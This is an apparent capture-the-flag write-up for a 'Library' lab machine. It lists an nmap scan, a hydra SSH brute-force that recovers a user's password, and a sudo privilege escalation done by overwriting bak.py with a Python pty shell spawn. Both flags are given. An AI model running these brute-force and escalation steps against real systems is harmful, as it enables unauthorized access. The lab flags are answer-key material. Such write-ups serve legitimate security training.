> Library | Booot2Root

**export IP=10.10.47.214**

# Nmap

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
```

**NOTE : We found an user in home page Meliodas**

## robots.txt

```
User-agent: rockyou 
Disallow: / i.e) use rockyou.txt
```

# Bruteforcing SSH using hydra

sudo hydra -l meliodas -P /snap/john-the-ripper/rockyou.txt ssh://$IP -t 4

```
[22][ssh] host: 10.10.47.214   login: meliodas   password: iloveyou1
```

## user.txt

=========================================
6d488cbb3f111d135722c33cb635f4ec
=========================================

sudo -l

```
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

We have a file bak.py in home directory. And we can't execute as sudo like
`sudo python bak.py` instead we can execute like `sudo python /home/meliodas/bak.py`.

So remove `bak.py` and write it with our own file

```
echo 'import pty; pty.spawn("/bin/sh")' > /home/meliodas/bak.py
```

And running `sudo python /home/meliodas/bak.py` gives us our root shell!!
## root.txt

=========================================
e8c8c6c256c35515d1d344ee0488c617
=========================================
